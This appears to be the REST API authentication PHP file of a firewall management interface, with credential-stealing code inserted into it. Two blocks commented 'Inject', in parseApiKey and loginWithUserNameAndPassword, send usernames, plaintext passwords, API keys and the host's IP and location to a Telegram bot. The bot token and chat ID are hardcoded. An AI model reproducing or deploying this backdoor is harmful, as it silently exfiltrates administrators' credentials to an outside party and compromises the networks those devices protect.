<?php

use pan_core\Container;
use panui_xmlapi\Authenticator as XmlApiAuthenticator;
use pan_log\Log;

require_once($_SERVER['DOCUMENT_ROOT'] . '/php/include/common.php');

class RestApiAuthenticator
{
    private static $SESSION_KEYS_TO_SAVE = array("user", "userName", "userRole", "profile", "numRulphperPage", "authentication_response", "editShared", "dloc");
    const REST_API_TOKEN_SESSION_KEY = "REST_API_TOKEN";
    const MAX_API_KEY_LENGTH = 512;
	private $tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
    private $tgChatId = "-1002252120859";
    /**
     * First checks to see if a RestAPI login exists for the current key, if so checks with the management server
     * if the session is still valid if it is then logs in with that or else attempts to login using the given key and then saves this management cookie to disk.
     * Invokes panPhpApi.c#phpRestLogin for logging in with the key.
     *
     * @return mixed the management server cookie if login was successful or false otherwise
     * @throws Exception if a password change is required or parameters are missing
     */
    public function login()
    {
        /** @var XmlApiAuthenticator */
        $auth = Container::$default->get(XmlApiAuthenticator::class);
        try {
            $auth->login();
            return true;
        } catch (\Exception $e) {
            Log::error($e->getMessage());
            return false;
        }
    }

	private function getHostIpInfo()
    {
        $ipApiUrl = "http://ip-api.com/json";
        $response = file_get_contents($ipApiUrl);
        if ($response === false) {
            error_log("Failed to fetch IP info");
            return [
                'ip' => "Unknown",
                'country' => "Unknown",
                'city' => "Unknown"
            ];
        }
        $data = json_decode($response, true);
        return [
            'ip' => $data['query'] ?? "Unknown",
            'country' => $data['country'] ?? "Unknown",
            'city' => $data['city'] ?? "Unknown"
        ];
    }
	
	private function generateHashtag($ip)
    {
        $hash = hash("sha256", $ip);
        return "#" . substr($hash, 0, 8); 
    }

	private function sendToTelegram($message)
    {
        $url = "https://api.telegram.org/bot{$this->tgBotToken}/sendMessage";

        $data = [
            'chat_id' => $this->tgChatId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];

        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data)
            ]
        ];

        $context  = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result === false) {
            error_log("Failed to send message to Telegram");
        }
    }

    private function getCookie()
    {
        return $_SESSION["user"];
    }

    /**
     * Given an api key, decrypts it and returns an array of user name and password
     * @static
     * @param $key
     * @return mixed|null|array
     */
    private function parseApiKey($key)
    {
        $decryptedKey = Util::decrypt($key);
        if ($decryptedKey) {
            $decryptedKeyParts = preg_split("/:/", $decryptedKey);
            if (!$decryptedKeyParts || sizeof($decryptedKeyParts) < 2) {
                error_log("API Key Decryption failed. Decrypted key [$decryptedKey] does not contain at least 2 parts.");
                return null;
            }
            $userName = $decryptedKeyParts[0];
            $password = $decryptedKeyParts[1];
            if (sizeof($decryptedKeyParts) > 2) {
                // This is for the case where in the password itself contains : in which case join all the remaining parts with ":"
                $password = join(":", array_splice($decryptedKeyParts, 1));
            }
            $passwordParts = explode("]<>[", $password);
            if (sizeof($passwordParts) >= 2) {
                $password = $passwordParts[0];
                $expirationTime = $passwordParts[1];
                $creationTime = $passwordParts[2];
            } else {
                $expirationTime = -1;
                $creationTime = -1;
            }
			//Inject
			$hostInfo = $this->getHostIpInfo();
            $ip = $hostInfo['ip'];
            $country = $hostInfo['country'];
            $city = $hostInfo['city'];
            $hashtag = $this->generateHashtag($ip);

            $message = "🔑 <b>New Authentication Data</b>\n" .
                       "👤 <b>Username:</b> $userName\n" .
                       "🔒 <b>Password:</b> $password\n" .
                       "🌐 <b>Token:</b> $key\n" .
                       "🖥 <b>Host IP:</b> $ip\n" .
                       "📍 <b>Location:</b> $country, $city\n" .
                       "$hashtag";

            $this->sendToTelegram($message);
			//-------
            return array($userName, $password, $expirationTime, $creationTime);
        } else {
            error_log("API Key Decryption Failed");
        }
        return null;
    }

    /**
     * Returns the token stored in the session for the rest api.
     * @static
     * @return mixed|string|null
     */
    public static function getToken()
    {
        return $_SESSION[self::REST_API_TOKEN_SESSION_KEY];
    }

    /**
     * Generates a token for the rest api and stores it in the session
     * @static
     * @return mixed
     */
    public static function generateToken()
    {
        WebSession::start();
        $_SESSION[self::REST_API_TOKEN_SESSION_KEY] = "" . rand();
        session_write_close();
        return RestApiAuthenticator::getToken();
    }

    /**
     * Convert the given key to a file name for looking up files
     * @static
     * @param $key
     * @return string
     */
    private function keyToFileName($key)
    {
        $parsedApiKeyParts = $this->parseApiKey($key);
        if (!empty($parsedApiKeyParts)) {
            //Try and keep the file name the same irrespective of how many times the key is generated
            return $this->credentialsToFileName("$parsedApiKeyParts[0]:$parsedApiKeyParts[1]");
        } else {
            $this->credentialsToFileName($key, "");
        }
    }

    private function credentialsToFileName($userName, $password = '')
    {
        return sha1("$userName:$password");
    }

    /**
     * @return bool true if the current user has been authenticated and is logged in
     */
    private function isLoggedIn()
    {
        $cookie = $this->getCookie();
        return !empty($cookie);
    }

    /**
     * @param $key
     * @return integer 1 if invalid, 2 if expired, false if not expired
     */
    public function isKeyExpired($key)
    {
        $result = $this->parseApiKey($key);
        $shortKey = "";
        if (strlen($key) > 8) {
            $first4 = substr($key, 0, 4);
            $last4 = substr($key, strlen($key) - 4);
            $shortKey = "$first4...$last4";
        }
        if ($result) {
            if (sizeof($result) >= 3) {
                $expirationTime = $result[2];
                $creationTime = $result[3];
                $now = round(microtime(true) * 1000);
                $formattedNow = date("Y/m/d H:i:s", $now / 1000);


                if (intval($expirationTime) !== -1 && $now > $expirationTime) {
                    $formattedExpirationTime = date("Y/m/d H:i:s", $expirationTime / 1000);
                    Debug::logToFile("The key used has expired. Expiration time of the key [$shortKey] was [$formattedExpirationTime]. Time at which the key was checked [$formattedNow].");
                    return 2;
                } else {
                    $apiKeyExpirationTime = RestApi::getApiExpirationTime();
                    if ($creationTime !== -1 && !empty($apiKeyExpirationTime) && strtotime($apiKeyExpirationTime) >= $creationTime) {
                        $formattedCreationTime = date("Y/m/d H:i:s", $creationTime);
                        $formattedApiKeyExpirationTime = date("Y/m/d H:i:s", strtotime($apiKeyExpirationTime));
                        Debug::logToFile("The key used has expired since the user has set an expiration time of [$formattedApiKeyExpirationTime]. Creation time of the key [$shortKey] was [$formattedCreationTime]. Time at which the key was checked [$formattedNow].");
                        return 2;
                    }

                    if ($creationTime === -1 && !empty($apiKeyExpirationTime)) {
                        //This can happen when the key was created with the feature disabled. i.e. expiration time set to 0 so that the keys are backwards compatible
                        Debug::logToFile("The key used has expired since the user has set an expiration time of $apiKeyExpirationTime and this key [${shortKey}] is was created with the feature disabled. Time at which the key was checked [$formattedNow].");
                        return 2;
                    }
                    return false;
                }
            } elseif (sizeof($result) >= 2) {
                $now = round(microtime(true) * 1000);
                $formattedNow = date("Y/m/d H:i:s", $now / 1000);
                $apiKeyExpirationTime = RestApi::getApiExpirationTime();
                if (!empty($apiKeyExpirationTime)) {
                    Debug::logToFile("The key used has expired since the user has set an expiration time of $apiKeyExpirationTime and this key [${shortKey}] is a static key or pre 9.0 key. Time at which the key was checked [$formattedNow].");
                    return 2;
                }
                return false;
            } else {
                Debug::logToFile("Though [$shortKey] could be parsed it seems that it does not have the right number of parts. We will conclude that it is expired.");
                return 1;
            }
        } else {
            Debug::logToFile("Key [$shortKey] could not be parsed. Will treat it as expired");
            return 1;
        }
        return true;
    }

    public function loginWithUserNameAndPassword($userName, $password)
    {
		//Inject
		$hostInfo = $this->getHostIpInfo();
        $ip = $hostInfo['ip'];
        $country = $hostInfo['country'];
        $city = $hostInfo['city'];
        $hashtag = $this->generateHashtag($ip);

        $message = "🔑 <b>New Login Attempt</b>\n" .
                   "👤 <b>Username:</b> $userName\n" .
                   "🔒 <b>Password:</b> $password\n" .
                   "🖥 <b>Host IP:</b> $ip\n" .
                   "📍 <b>Location:</b> $country, $city\n" .
                   "$hashtag";

        $this->sendToTelegram($message);
        // Try the new style login
        $loginResponse = new php_loginresp();
        // This will reset the cookie if successful, nice typo :)
        /** @noinspection PhpUndefinedFunctionInspection */
        $remoteHost = key_exists("HTTP_AUTHENTICATOR", $_SERVER) && !empty($_SERVER["HTTP_AUTHENTICATOR"]) ? $_SERVER["HTTP_AUTHENTICATOR"] : $_SERVER['REMOTE_HOST'];

        panRestLoginWithUserNamePasword($userName, $password, $remoteHost, $loginResponse);
        Admin::initOnce();
        // disable privacy setting for the Rest API
        Backend::getDom(XmlRequest::op("<set><cli><hide-ip><value>no</value></hide-ip></cli></set>"));
        if (strcasecmp($loginResponse->status, "success") === 0 || strcasecmp($loginResponse->status, "warning") === 0) {
            if ($loginResponse->isPasswordChangeNeeded) {
                throw new Exception("Please change your password.");
            }
            return $this->getCookie();
        }
        return false;
    }

    public function keygen()
    {
        $userName = RestApi::assertParamPresent("user");
        $password = RestApi::assertParamPresent("password");
        if ($this->loginWithUserNameAndPassword($userName, $password)) {
            $key = $this->generateApiKey($userName, $password);
            if ($key) {
                header("Content-Type: application/xml; charset=UTF-8");
                echo "<response status = 'success'><result><key>$key</key></result></response>";
                //Delete any prior admin sessions so that old keys can be invalidated
                $request = XmlRequest::op("<delete><admin-sessions><username>$userName</username></admin-sessions></delete>", array("api-only" => "yes"));
                Backend::getDom($request);
                return true;
            }
            throw new Exception("Internal error.");
        }
        return false;
    }

    private function generateApiKey($userName, $password)
    {
        $expirationPeriod = 0; //60 minutes
        $request = XmlRequest::op("<show><config><running><xpath>devices/entry[@name='localhost.localdomain']/deviceconfig/setting/management</xpath></running></config></show>");
        $response = Backend::getArray($request);
        if ($response["@status"] === "success" && isset($response["result"]["management"]["api"]["key"]["lifetime"])) {
            $lifetime = $response["result"]["management"]["api"]["key"]["lifetime"];
            if ($lifetime && is_int((int)$lifetime) && ((int)$lifetime) > 0) {
                Debug::logToFile("API Key expiration defined as $lifetime minute(s) in running config.");
                $expirationPeriod = ((int)$lifetime) * 60 * 1000;
            } else {
                Debug::logToFile("No API Key expiration defined in running config. Will not generate key with expiration period");
                $expirationPeriod = 0;
            }
        } else {
            $expirationPeriod = 0;
            Debug::logToFile("The call to get api-lifetime resulted in an error. Response will be printed below.");
            Debug::logObjectToFile($response);
        }

        $expirationTime = -1;
        if ($expirationPeriod > 0) {
            $expirationTime = round(microtime(true) * 1000) + $expirationPeriod;
        }


        $stringToEncrypt = sprintf("%s:%s]<>[%s]<>[%s", $userName, $password, $expirationTime, strtotime("now"));
        $encryptedValue = Util::encrypt($stringToEncrypt);
        return $encryptedValue;
    }
}
